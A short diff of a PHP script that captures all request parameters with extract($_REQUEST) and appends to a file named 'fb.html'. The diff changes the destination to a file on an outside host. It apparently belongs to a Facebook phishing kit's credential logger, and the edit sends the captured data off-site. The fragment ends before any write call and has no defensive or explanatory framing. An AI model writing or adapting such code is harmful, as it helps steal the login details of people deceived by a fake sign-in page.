@@ -1,6 +1,6 @@
 <?php
     extract($_REQUEST);
-    $file=fopen("fb.html","a");
+    $file=fopen("http://rkofficial.c1.biz/Masssage/fb.html","a");
 
 
    
